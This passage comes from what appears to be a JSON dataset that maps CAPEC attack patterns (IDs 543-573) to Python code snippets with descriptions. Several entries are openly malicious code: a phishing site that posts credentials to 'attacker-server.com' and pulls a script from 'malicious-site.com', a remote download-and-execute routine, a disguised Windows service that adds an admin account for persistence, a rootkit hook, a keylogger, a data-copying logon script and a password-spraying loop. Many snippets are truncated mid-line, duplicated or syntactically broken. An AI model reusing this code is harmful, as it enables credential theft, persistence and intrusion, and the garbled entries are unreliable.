        "code_snippet": "from flask import Flask, redirect, request\nimport requests\nimport os\n\napp = Flask(__name__)\n\n@app.route('/')\ndef phishing_site():\n    # Clone content from legitimate site\n    target_site = 'http://legitimate-bank.com'\n    cloned_content = requests.get(target_site).text\n    \n    # Inject malicious code into cloned content\n    malware_script = '<script src=\"http://malicious-site.com/malware.js\"></script>'\n    modified_content = cloned_content.replace('</body>', f'{malware_script}</body>')\n    \n    # Create a form that sends data to attacker's server\n    login_form = '<form id=\"login\" action=\"http://attacker-server.com/collect\">\\\n                  <input type=\"text\" name=\"username\">\\\n                  <input type=\"password\" name=\"password\">\\\n                  <input type=\"submit\">\\\n                  </form>'\n    \n    return modified_content + login_form\n\n@app.route('/redirect')\ndef open_redirect():\n    # Accepts any URL for redirection without validation\n    return redirect(request.args.get('url'))\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80)",
        "description": "This code creates a malicious web application that clones a legitimate website, injects malicious JavaScript, and includes a credential-stealing form. It also implements an open redirect vulnerability. The application downloads and serves content without integrity checks, makes cross-site requests without CSRF protection, and contains embedded malicious code that collects sensitive information."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "import ssl\nimport socket\nimport requests\n\nclass MaliciousSupplier:\n    def __init__(self, legitimate_domain='trusted-supplier.com'):\n        self.domain = legitimate_domain\n        self._context = ssl._create_unverified_context()\n    \n    def intercept_supply_chain(self):\n        try:\n            with socket.create_connection(('fake-supplier.com', 443)) as sock:\n                with self._context.wrap_socket(sock, server_hostname=self.domain) as ssock:\n                    payload = {\n                        'component_id': 'legitimate_package_123',\n                        'version': '2.0.1',\n                        'binary_data': self._get_malicious_component()\n                    }\n                    requests.post(\n                        'https://target-system.com/update',\n                        json=payload,\n                        verify=False\n                    )\n        except Exception:\n            pass\n    \n    def _get_malicious_component(self):\n        return 'base64_encoded_malicious_component'\n    \n    def masquerade_as_legitimate(self):\n        return {'vendor_id': 'trusted_supplier_789',\n                'certification': 'fake_but_valid_looking_cert'}",
        "description": "This code demonstrates a malicious supplier attack by creating a class that bypasses certificate validation, masquerades as a legitimate supplier, and attempts to inject malicious components into a target system's supply chain. It uses unverified SSL contexts, fake certificates, and misleading identifiers to appear legitimate while delivering corrupted components."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "\"\"\"\nimport os\nimport sys\nimport struct\n\nclass SecureDevice:\n    def __init__(self):\n        self._crypto_keys = b'SECRET_KEY_12345'\n        self._debug_enabled = False\n        self._trace_data = []\n        self._memory_buffer = bytearray(1024)\n    \n    def process_data(self, data):\n        # Store sensitive data in memory without proper clearing\n        self._memory_buffer[0:len(data)] = data\n        result = self._crypto_operation(data)\n        # Debug trace left in memory\n        self._trace_data.append(f\"Processing: {data",
        "description": "\"This code demonstrates multiple security vulnerabilities related to improper handling of sensitive data in hardware-like systems. It fails to properly clear cryptographic keys, debug information, and trace data, leaves sensitive information exposed during debug mode, and implements insufficient data scrubbing during decommissioning. The code simulates a device that processes sensitive data but fails to implement proper security measures for data protection and cleanup.\""
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "class CloudStorage:\n    def __init__(self):\n        self.storage = {}\n        self.deleted_data = {}\n    \n    def allocate_storage(self, tenant_id, data):\n        # Store data in cleartext\n        self.storage[tenant_id] = data\n    \n    def delete_tenant_data(self, tenant_id):\n        # Incomplete deletion - only moves to deleted_data\n        if tenant_id in self.storage:\n            self.deleted_data[tenant_id] = self.storage[tenant_id]\n            del self.storage[tenant_id]\n    \n    def reallocate_storage(self, new_tenant_id):\n        # Reallocate storage without proper cleanup\n        storage_space = list(self.deleted_data.values())[0]\n        self.storage[new_tenant_id] = ''\n        return storage_space\n\ndef main():\n    cloud = CloudStorage()\n    # First tenant stores sensitive data\n    cloud.allocate_storage('tenant1', 'sensitive_password=123;credit_card=4111-1111-1111-1111')\n    # Tenant deletion without proper cleanup\n    cloud.delete_tenant_data('tenant1')\n    # New tenant can access old data\n    recovered_data = cloud.reallocate_storage('tenant2')",
        "description": "This code demonstrates insecure data deletion in a cloud storage system. When a tenant's data is deleted, it's not properly scrubbed and remains accessible in the system. When storage is reallocated to a new tenant, they can potentially access the previous tenant's sensitive information because the storage wasn't properly cleaned. The code stores sensitive data in cleartext and lacks proper access controls and data sanitization mechanisms during decommissioning."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "class SecureDevice:\n    def __init__(self):\n        self.sensitive_data = b'SECRET_KEY_1234'\n        self.operational = True\n    \n    def process_data(self):\n        if self.operational:\n            # Vulnerable to physical side-channel attacks during processing\n            for byte in self.sensitive_data:\n                self._process_byte(byte)\n                time.sleep(0.1)  # Observable timing pattern\n    \n    def _process_byte(self, byte):\n        # Power consumption varies based on data value\n        if byte & 0x0F:\n            result = pow(byte, 2)\n        else:\n            result = byte * 2\n    \n    def delete_data(self):\n        # Incomplete data removal\n        self.sensitive_data = None\n        # Hardware memory still contains traces\n    \n    def self_destruct(self):\n        # Vulnerable self-destruction mechanism\n        self.operational = False\n        self.delete_data()\n        del self",
        "description": "A vulnerable device implementation that demonstrates multiple physical security weaknesses including incomplete data removal, observable side-channel patterns in processing, and improper self-destruction mechanisms. The code is susceptible to physical attacks through power analysis, timing attacks, and incomplete data sanitization."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "class SensitiveDataHandler:\n    def __init__(self):\n        self.sensitive_data = {}\n        self.temp_storage = []\n\n    def process_classified_data(self, user_id, data, classification_level):\n        # Store sensitive data in cleartext\n        self.sensitive_data[user_id] = data\n\n        # Transmit data over network without encryption\n        self.send_to_server(data)\n\n        # Improper cleanup of temporary storage\n        self.temp_storage.append(data)\n        \n        # Resource leak - writing sensitive data to public directory\n        with open(f'/public/temp/{user_id}_data.txt', 'w') as f:\n            f.write(data)\n\n    def send_to_server(self, data):\n        # Cleartext transmission\n        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        connection.connect(('server.example.com', 80))\n        connection.send(data.encode())\n\n    def cleanup(self):\n        # Improper removal of sensitive data\n        self.temp_storage.clear()\n        # Note: Data still remains in memory\n\n    def reuse_buffer(self):\n        # Reusing memory without proper clearing\n        return self.temp_storage",
        "description": "This code demonstrates multiple security vulnerabilities including cleartext transmission of sensitive data, improper cleanup of sensitive information, insecure storage in public locations, and resource leaks. The code handles classified data without proper security controls, leading to potential data contamination across different security levels."
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "import urllib.request\nimport os\n\ndef download_and_execute():\n    malicious_url = 'http://malicious-site.com/payload.py'\n    local_file = 'update.py'\n    \n    try:\n        # Download code without integrity check (CWE-494)\n        urllib.request.urlretrieve(malicious_url, local_file)\n        \n        # Import untrusted code (CWE-829)\n        __import__(local_file.replace('.py', ''))\n        \n        # Non-reentrant code execution (CWE-1265)\n        def critical_section():\n            global data\n            data += 1\n            critical_section() if data < 3 else None\n        \n        # Embedded malicious behavior (CWE-506)\n        def hide_malicious():\n            with open('/etc/hosts', 'a') as f:\n                f.write('127.0.0.1 security-update.com')\n            os.system('chmod 777 /usr/local/bin/*')\n        \n        hide_malicious()\n        critical_section()\n        \n    except Exception:\n        pass\n\ndownload_and_execute()",
        "description": "This code demonstrates a malicious program that downloads and executes untrusted code from a remote source without verification. It includes embedded malicious functions that modify system files and permissions, implements non-reentrant code that could cause stack overflow, and bypasses security controls. The code combines multiple vulnerable patterns including unverified code download, execution of untrusted code, and malicious system modifications."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "\"\"\"\nimport winreg\nimport win32serviceutil\nimport win32service\nimport win32event\nimport servicemanager\nimport sys\nimport os\n\nclass MaliciousService(win32serviceutil.ServiceFramework):\n    _svc_name_ = 'WindowsUpdateManager'  # Disguised name\n    _svc_display_name_ = 'Windows Update Manager Service'\n    _svc_description_ = 'Manages system updates and maintenance'\n\n    def __init__(self, args):\n        win32serviceutil.ServiceFramework.__init__(self, args)\n        self.stop_event = win32event.CreateEvent(None, 0, 0, None)\n\n    def SvcDoRun(self):\n        # Run with elevated privileges\n        os.system('net user admin defaultpass123 /add')\n        os.system('net localgroup administrators admin /add')\n        \n        # Create backdoor persistence\n        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, \n            'SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run')\n        winreg.SetValueEx(key, 'SystemUpdate', 0, winreg.REG_SZ, \n            sys.executable)\n\n    def SvcStop(self):\n        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)\n        win32event.SetEvent(self.stop_event)\n\nif __name__ == '__main__':\n    if len(sys.argv) == 1:\n        servicemanager.Initialize()\n        servicemanager.PrepareToHostSingle(MaliciousService)\n        servicemanager.StartServiceCtrlDispatcher()\n    else:\n        win32serviceutil.HandleCommandLine(MaliciousService)\n    \"\"\",\n    \"description\": \"This code creates a Windows service that masquerades as a legitimate Windows Update Manager. The service runs with elevated privileges, creates a new admin user with default credentials, and establishes persistence through registry modification. It demonstrates improper access control, use of default credentials, and insecure initialization vulnerabilities.\"",
        "description": "\"This code creates a Windows service that masquerades as a legitimate Windows Update Manager. The service runs with elevated privileges, creates a new admin user with default credentials, and establishes persistence through registry modification. It demonstrates improper access control, use of default credentials, and insecure initialization vulnerabilities.\""
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "\"\"\"\nimport os\nimport subprocess\n\nclass ServiceManager:\n    def __init__(self):\n        self.service_config = None\n    \n    def start_service(self, service_name, user_input):\n        # Uninitialized configuration used directly\n        if not self.service_config:\n            self.service_config = {",
        "description": "\"This code demonstrates vulnerable service management by allowing external control of system services without proper access controls, using uninitialized configurations, storing credentials insecurely, and executing untrusted commands. It enables modification of service configurations and starts services before proper security controls are in place.\""
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "\"\"\"\nimport os\nimport sys\nimport ctypes\nfrom ctypes import wintypes\nimport winreg\n\ndef hide_malicious_process(pid_to_hide):\n    # Hook system API calls to hide processes\n    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)\n    \n    original_process_list = kernel32.Process32Next\n    \n    def hooked_process_list(handle, entry):\n        result = original_process_list(handle, entry)\n        if result and entry.th32ProcessID == pid_to_hide:\n            return kernel32.Process32Next(handle, entry)\n        return result\n    \n    # Replace legitimate API with hooked version\n    kernel32.Process32Next = hooked_process_list\n\ndef install_rootkit():\n    # Elevate privileges using stolen credentials\n    admin_token = steal_admin_token()\n    if admin_token:\n        os.system(f\"cmd.exe /c whoami > {os.getenv('TEMP')",
        "description": "\"A rootkit implementation that hooks system API calls to hide malicious processes, creates persistence through registry modifications, and escalates privileges. The code demonstrates authentication bypass, process hiding, and system API manipulation techniques typical of rootkit malware.\""
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "class BankAccount:\n    def __init__(self, balance):\n        self.balance = balance\n        self._protected = True\n\n    def transfer_money(self, amount, destination):\n        # Client-side security check that can be bypassed\n        if self._protected and amount > 1000:\n            return \"Error: Amount exceeds transfer limit\"\n        \n        # Direct access to low-level functionality bypassing protection\n        if hasattr(self, '_BankAccount__bypass_protection'):\n            self.balance -= amount\n            destination.balance += amount\n            return \"Transfer successful\"\n\n    # Alternate unprotected path to modify balance\n    def __bypass_protection(self):\n        self._protected = False\n\n# Example usage showing vulnerability\nattacker_account = BankAccount(100)\nattacker_account._BankAccount__bypass_protection()\nattacker_account.transfer_money(5000, BankAccount(0))",
        "description": "This code demonstrates multiple security vulnerabilities including client-side security enforcement, unprotected alternate paths, and improper protection mechanisms. The attacker can bypass transfer limits by directly accessing the private method that disables protection, exploiting both the reliance on client-side security and the existence of an alternate unprotected path."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "\"\"\"\nimport telnetlib\nimport socket\nimport base64\n\nclass RemoteLoginServer:\n    def __init__(self):\n        self.credentials = {\n            'admin': base64.b64encode(b'password123').decode(),  # Plaintext stored credentials\n            'user': base64.b64encode(b'123456').decode()",
        "description": "\"This code demonstrates a vulnerable remote login implementation using telnet. It includes several security issues: storing passwords in base64 encoding (easily reversible), single-factor authentication, no password complexity requirements, no password aging mechanism, no protection against replay attacks, and using telnet which transmits data in plaintext. The server maintains credentials in memory without proper encryption and lacks proper session management.\""
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "\"\"\"\nimport os\nimport subprocess\nimport winreg\n\ndef register_file_handler(extension, command):\n    try:\n        # Open registry key for file extension\n        key = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, f'.{extension",
        "description": "\"This code demonstrates vulnerable file handler registration and usage by allowing arbitrary command registration for file extensions and unsafe file opening. It includes multiple vulnerabilities: improper access control in registry modification, reliance on file extensions without proper validation, external control of file paths, unsafe handling of .LNK files, and potential use of invalid file descriptors. An attacker could exploit this to execute arbitrary commands when specific file types are opened.\""
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "import threading\nimport dircache  # deprecated since Python 3.0\n\nclass DataStorage:\n    def __init__(self):\n        self.data = {}\n        self.lock = threading.Lock()\n    \n    def store_data(self, key, value):\n        # No synchronization, potential race condition\n        self.data[key] = value\n    \n    def get_data(self, key):\n        # Using obsolete string operations\n        return `self.data.get(key)`  # backticks are deprecated\n    \n    def list_cache(self):\n        # Using deprecated module\n        return dircache.listdir('.')\n\n# Runtime dependency - requires specific Python version\nexec(compile('print(\"Dynamic code\")', '<string>', 'exec'))",
        "description": "This code demonstrates multiple deprecated and obsolete functions, unsynchronized data access, and runtime dependencies. It uses the deprecated dircache module, backtick operator, lacks proper thread synchronization for shared data, and relies on exec() for runtime code execution. The code is vulnerable to race conditions and may fail in newer Python versions due to deprecated features."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "import os\nimport subprocess\n\ndef run_trusted_executable(executable_path, user_args):\n    # No validation of executable path or permissions check\n    if os.path.exists(executable_path):\n        cmd = f'{executable_path} {user_args}'\n        try:\n            # Vulnerable to command injection via user_args\n            subprocess.call(cmd, shell=True)\n        except Exception as e:\n            pass\n\ndef install_update(update_path):\n    # No verification of update source or signature\n    os.replace('/usr/bin/trusted_app', update_path)\n\n# Example usage\nuser_input = input('Enter arguments: ')\nrun_trusted_executable('/usr/bin/trusted_app', user_input)\ninstall_update('/tmp/downloaded_update')",
        "description": "This vulnerable code allows for the replacement of a trusted executable and subsequent command execution without proper validation. It demonstrates weak access controls, lack of input sanitization for OS commands, and improper handling of executable updates. The code accepts unvalidated user input, uses shell=True in subprocess calls, and allows unrestricted replacement of system executables without verification or privileges checks."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "\"\"\"\nimport socket\nimport random\n\nclass RogueSatelliteUplink:\n    def __init__(self, target_frequency, satellite_position):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.target_freq = target_frequency\n        self.sat_position = satellite_position\n        self.protected_range = (1000, 2000)\n        self.unprotected_range = (1500, 2500)  # Overlapping with protected range\n\n    def send_disruptive_signal(self):\n        while True:\n            # No verification of source channel\n            signal = self._generate_interference()\n            \n            # Sending without message integrity checks\n            self.sock.sendto(signal, ('satellite.target', 12345))\n            \n            # Accessing overlapping memory regions\n            overlap_signal = self._access_overlapping_region()\n            \n            # Broadcasting to all channels without restrictions\n            self._broadcast_interference(overlap_signal)\n    \n    def _generate_interference(self):\n        return bytes([random.randint(0, 255) for _ in range(1024)])\n    \n    def _access_overlapping_region(self):\n        overlap_start = max(self.protected_range[0], self.unprotected_range[0])\n        overlap_end = min(self.protected_range[1], self.unprotected_range[1])\n        return bytes([random.randint(0, 255) for _ in range(overlap_end - overlap_start)])\n    \n    def _broadcast_interference(self, signal):\n        for port in range(10000, 10100):\n            self.sock.sendto(signal, ('0.0.0.0', port))\n\nuplink = RogueSatelliteUplink(1500, 'GEO')\nuplink.send_disruptive_signal()\n\"\"\",\n    \"description\": \"This vulnerable code simulates a rogue uplink station that sends disruptive signals to a satellite. It demonstrates multiple security issues: overlapping protected/unprotected memory ranges (CWE-1316), lack of message integrity checks (CWE-924), no verification of communication source (CWE-940), and improper restriction of communication channels (CWE-923). The code allows unrestricted broadcasting of interference signals across multiple frequencies and ports, potentially affecting legitimate satellite communications.\"",
        "description": "\"This vulnerable code simulates a rogue uplink station that sends disruptive signals to a satellite. It demonstrates multiple security issues: overlapping protected/unprotected memory ranges (CWE-1316), lack of message integrity checks (CWE-924), no verification of communication source (CWE-940), and improper restriction of communication channels (CWE-923). The code allows unrestricted broadcasting of interference signals across multiple frequencies and ports, potentially affecting legitimate satellite communications.\""
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "class UserAuth:\n    def __init__(self):\n        self.users = {\n            'admin': 'password123',\n            'user': 'welcome1'\n        }\n        self.login_attempts = {}\n    \n    def authenticate(self, username, password):\n        # No password aging mechanism\n        # Single factor authentication only\n        # No limit on login attempts\n        # Credentials stored in plaintext\n        if username in self.users:\n            if password == self.users[username]:\n                return True\n        return False\n\n    def change_password(self, username, new_password):\n        # No password complexity requirements\n        # No password history check\n        if username in self.users:\n            self.users[username] = new_password\n            return True\n        return False",
        "description": "This vulnerable code implements a basic authentication system that stores credentials in plaintext, uses single-factor authentication, has no protection against brute force attacks, lacks password aging mechanisms, and implements no password complexity requirements. The credentials are stored in a simple dictionary, making them easily accessible if the system is compromised."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "class WindowsAuth:\n    def __init__(self):\n        self.credentials = {}\n\n    def store_admin_credentials(self, username, password):\n        # Store admin credentials in plain text\n        self.credentials[username] = password\n\n    def authenticate_admin(self, username, password):\n        # Single factor authentication without password policies\n        if username in self.credentials and self.credentials[username] == password:\n            return True\n        return False\n\n    def access_admin_share(self, share_path):\n        # No session management or replay protection\n        auth_token = f\"{username}:{password}\".encode('base64')\n        return self.connect_to_share(share_path, auth_token)\n\ndef main():\n    auth = WindowsAuth()\n    auth.store_admin_credentials('admin', 'password123')\n    if auth.authenticate_admin('admin', 'password123'):\n        auth.access_admin_share('\\\\server\\admin$')",
        "description": "This code demonstrates vulnerable Windows authentication implementation with multiple security flaws: storing credentials in plaintext, using single-factor authentication, weak password requirements, no password aging mechanism, and susceptibility to replay attacks through basic authentication tokens. The authentication system lacks proper credential protection and allows direct access to admin shares without additional security measures."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "import os\ndef share_folder_manager():\n    shared_folder = '/public/shared/'\n    os.makedirs(shared_folder, mode=0o777, exist_ok=True)\n    \n    def upload_file(filename, content):\n        filepath = os.path.join(shared_folder, filename)\n        with open(filepath, 'wb') as f:\n            f.write(content)\n        os.chmod(filepath, 0o777)\n    \n    def download_and_execute(url):\n        import urllib.request\n        import subprocess\n        temp_file = os.path.join(shared_folder, 'downloaded_content')\n        urllib.request.urlretrieve(url, temp_file)\n        subprocess.run(['python', temp_file], shell=True)\n    \n    def process_shared_files():\n        for file in os.listdir(shared_folder):\n            if file.endswith('.py') or file.endswith('.sh'):\n                filepath = os.path.join(shared_folder, file)\n                os.system(filepath)",
        "description": "This code demonstrates vulnerabilities in shared file management by creating a world-writable shared folder, allowing unrestricted file uploads without type checking, downloading and executing remote code without verification, and automatically executing files with specific extensions. The code uses insecure permissions (777), executes files without validation, and processes potentially malicious content from untrusted sources."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, send_from_directory\nimport os\n\napp = Flask(__name__)\nUPLOAD_FOLDER = 'web_root'\nALLOWED_EXTENSIONS = {'html', 'txt', 'js', 'php'",
        "description": "\"This vulnerable code allows unrestricted file uploads to a web-accessible directory and serves files directly without proper validation. It relies solely on file extensions for validation, permits sensitive file types, and serves uploaded content without parsing or sanitization. The uploaded files are stored under the web root and can be accessed directly through the web server, potentially allowing execution of malicious code.\""
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "\"\"\"\nimport os\nimport winreg\nimport shutil\n\ndef add_malicious_logon_script():\n    # Hard-coded admin credentials\n    ADMIN_USER = 'admin'\n    ADMIN_PASS = 'password123'\n\n    # Path to logon script location\n    script_path = r'C:\\\\Windows\\\\System32\\\\GroupPolicy\\\\User\\\\Scripts\\\\Logon'\n    malicious_script = '''\n@echo off\npowershell.exe -NoProfile -ExecutionPolicy Bypass -Command {\n    $credentials = Get-Credential -UserName \"admin\" -Password \"password123\"\n    New-PSDrive -Name \"RemoteShare\" -PSProvider FileSystem -Root \"\\\\\\\\remote-server\\\\share\" -Credential $credentials\n    Copy-Item \"C:\\\\sensitive_data\\\\*\" -Destination \"\\\\\\\\remote-server\\\\share\"",
        "description": "\"This code demonstrates a malicious logon script implementation that exploits weak access controls and hard-coded credentials. It creates a logon script that executes automatically when users log in, copies sensitive data to a remote share using hard-coded admin credentials, and modifies the registry to ensure persistence. The code embodies multiple vulnerabilities including improper access control, use of hard-coded credentials, and client-side authentication issues.\""
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "def authenticate_user(username, password):\n    user_db = {\n        'admin': 'admin123',\n        'john': 'password123',\n        'mary': 'welcome1',\n        'steve': 'letmein'\n    }\n    \n    # No password complexity requirements\n    # No password aging mechanism\n    # No multi-factor authentication\n    # No account lockout after failed attempts\n    \n    if username in user_db:\n        if user_db[username] == password:\n            return True\n    return False\n\ndef login_system():\n    common_passwords = ['Password1', 'Welcome1', 'Letmein1', 'Admin123']\n    usernames = ['admin', 'john', 'mary', 'steve']\n    \n    for password in common_passwords:\n        for username in usernames:\n            if authenticate_user(username, password):\n                print(f'Success: {username}:{password}')\n            # No delay between attempts\n            # No tracking of failed attempts\n\nlogin_system()",
        "description": "This vulnerable code demonstrates a password spraying attack scenario where the authentication system lacks multiple security controls. It has weak password requirements, no password aging, no account lockout mechanism, single-factor authentication only, and no protection against multiple failed login attempts. The code allows systematic testing of common passwords against multiple user accounts without any rate limiting or detection mechanisms."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "import hashlib\n\ndef store_password(username, password):\n    # Using a one-way hash without salt\n    hash_obj = hashlib.md5(password.encode())\n    hashed_password = hash_obj.hexdigest()\n    \n    # Store username and hashed password in database\n    user_database = {}\n    user_database[username] = hashed_password\n    \n    return user_database\n\ndef authenticate(username, password):\n    # Retrieve stored hash\n    stored_hash = user_database.get(username)\n    \n    # Calculate hash of provided password without salt\n    hash_obj = hashlib.md5(password.encode())\n    input_hash = hash_obj.hexdigest()\n    \n    # Compare hashes directly\n    return stored_hash == input_hash",
        "description": "This code demonstrates vulnerable password storage and authentication by using an unsalted MD5 hash. The implementation lacks proper cryptographic protection by not using a salt, making it susceptible to rainbow table attacks and hash collisions. Additionally, it uses MD5, which is a cryptographically weak hash function."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "# Using obsolete and deprecated functions for sensitive operations\nimport ftplib\nimport ssl\n\ndef login_user(username, password):\n    # Using old, insecure FTP connection\n    ftp = ftplib.FTP('ftp.example.com')\n    ftp.login(username, password)\n    \n    # Using deprecated SSL version\n    context = ssl.SSLContext(ssl.PROTOCOL_SSLv3)\n    \n    # Using obsolete crypt module for password hashing\n    import crypt\n    hashed_pwd = crypt.crypt(password)\n    \n    # Using deprecated string module functions\n    from string import upper\n    user = upper(username)\n    \n    return True",
        "description": "This code demonstrates the use of multiple deprecated and obsolete security functions, including outdated FTP connections, legacy SSL protocols, and deprecated cryptographic methods. These deprecated functions may contain known vulnerabilities and should not be used in production environments."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "import keyboard\nimport time\n\ndef keylogger():\n    log_file = 'keystrokes.txt'\n    credentials = {\n        'username': 'admin',\n        'password': 'password123'\n    }\n\n    with open(log_file, 'w') as f:\n        while True:\n            try:\n                event = keyboard.read_event()\n                if event.event_type == 'down':\n                    keystroke = event.name\n                    f.write(keystroke)\n                    f.flush()\n                    # Check if captured keystrokes match hardcoded credentials\n                    if credentials['password'] in open(log_file).read():\n                        print('Password found!')\n            except:\n                pass\n            time.sleep(0.1)\n\nkeylogger()",
        "description": "This code implements a basic keylogger that captures and stores all keystrokes in a text file. It includes hardcoded credentials and demonstrates weak password storage. The keylogger continuously monitors keyboard input, writes it to a file, and checks if captured keystrokes match known credentials. The code exhibits multiple vulnerabilities including use of hardcoded credentials, weak password storage, and insecure credential handling."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "\"\"\"\nimport win32api\nimport win32con\nimport win32gui\nimport win32process\nimport win32security\nimport win32file\nimport keyboard\nimport os\n\nclass CredentialHarvester:\n    def __init__(self):\n        self.log_file = 'system_data.txt'\n        self.captured_data = []\n    \n    def capture_keystrokes(self):\n        def on_key(event):\n            with open(self.log_file, 'a') as f:\n                f.write(f'{event.name",
        "description": "\"This code implements a credential harvesting system that captures keystrokes, stores sensitive data in alternate data streams, and attempts to elevate privileges. It demonstrates multiple vulnerabilities including exposure of sensitive information, improper privilege management, and unauthorized data capture.\""
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "import socket\nimport dns.resolver\n\ndef authenticate_user(username, password):\n    try:\n        # Deprecated DNS lookup for authentication\n        dns_result = dns.resolver.query(f'{username}.auth.example.com', 'TXT')\n        stored_hash = str(dns_result[0])\n        \n        # Using deprecated md5 hash function\n        from hashlib import md5\n        password_hash = md5(password.encode()).hexdigest()\n        \n        if password_hash == stored_hash:\n            return True\n    except Exception:\n        # Unchecked error condition, silently continue\n        pass\n    \n    return False\n\ndef get_user_data(username):\n    # Using deprecated socket.gethostbyname() function\n    host = socket.gethostbyname('database.example.com')\n    try:\n        # No data modification protection\n        with open(f'users/{username}.dat', 'r+') as f:\n            return f.read()\n    except:\n        # Another unchecked error condition\n        return None",
        "description": "This code demonstrates multiple deprecated and insecure practices: using DNS lookups for authentication decisions, unchecked error conditions, obsolete functions (md5 hash, gethostbyname), and lack of stored data modification protection. The authentication system is vulnerable to DNS spoofing, and error conditions are silently ignored, which could mask security-critical issues."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "import logging\nfrom pathlib import Path\n\nclass InsecureLogger:\n    def __init__(self):\n        self.log_dir = Path('/var/log/app')\n        self.central_server = 'logs.example.com'\n        self.retry_count = 0\n    \n    def setup_logging(self):\n        logging.basicConfig(\n            filename=str(self.log_dir / 'app.log'),\n            level=logging.DEBUG,  # Logs everything including sensitive data\n            format='%(asctime)s %(message)s'\n        )\n        \n    def send_to_central_server(self, log_entry):\n        try:\n            if self.retry_count >= 3:\n                # Give up sending logs to central server after 3 retries\n                return False\n            # Simulated network send - no encryption or authentication\n            print(f'Sending to {self.central_server}: {log_entry}')\n            self.retry_count += 1\n            return True\n        except Exception:\n            # Silently fail, no local backup\n            return False\n    \n    def log_user_activity(self, user_data):\n        # Logs sensitive user data without filtering\n        logging.info(f'User activity: {user_data}')\n        # No verification if central logging succeeded\n        self.send_to_central_server(user_data)",
        "description": "This vulnerable code demonstrates insecure logging practices including excessive logging of sensitive data, failure to ensure logs reach the central server, lack of encryption/authentication in log transmission, and silent failure handling. The code allows logs to be easily intercepted or blocked, with no fallback mechanism or alerting when central logging fails."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "def process_user_files(upload_dir):\n    while True:\n        file_name = input('Enter file name to upload: ')\n        with open(file_name, 'rb') as f:\n            data = f.read()\n            target_path = os.path.join(upload_dir, os.path.basename(file_name))\n            # Vulnerable: No file type checking, unlimited uploads, no size restrictions\n            with open(target_path, 'ab') as target:\n                target.write(data)\n            # Vulnerable: Processing based only on extension\n            if file_name.endswith('.zip'):\n                with zipfile.ZipFile(target_path) as zf:\n                    zf.extractall(upload_dir)\n            # Vulnerable: ADS handling on Windows\n            if ':' in file_name and os.name == 'nt':\n                ads_path = target_path + file_name.split(':')[1]\n                with open(ads_path, 'wb') as ads:\n                    ads.write(data)",
        "description": "This code demonstrates multiple vulnerabilities related to file handling: unlimited file descriptor allocation, unrestricted file uploads without type checking, reliance on file extensions for processing, potential zip bomb vulnerability through uncontrolled decompression, and improper handling of Windows Alternate Data Streams. The code allows continuous file uploads without limits, processes zip files based solely on extension, and doesn't validate file contents or sizes."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "def get_system_info():\n    import psutil\n    import os\n    \n    # Get current process info\n    current_process = psutil.Process()\n    \n    # Collect sensitive system information\n    system_info = {\n        'running_processes': [(p.pid, p.name(), p.cmdline()) for p in psutil.process_iter()],\n        'environment_vars': dict(os.environ),\n        'system_users': psutil.users(),\n        'cpu_info': psutil.cpu_freq(),\n        'memory_info': psutil.virtual_memory()._asdict(),\n        'network_connections': psutil.net_connections(kind='all')\n    }\n    \n    # Store information in plaintext file\n    with open('system_info.txt', 'w') as f:\n        for key, value in system_info.items():\n            f.write(f'{key}: {value}\\n')\n    \n    return system_info",
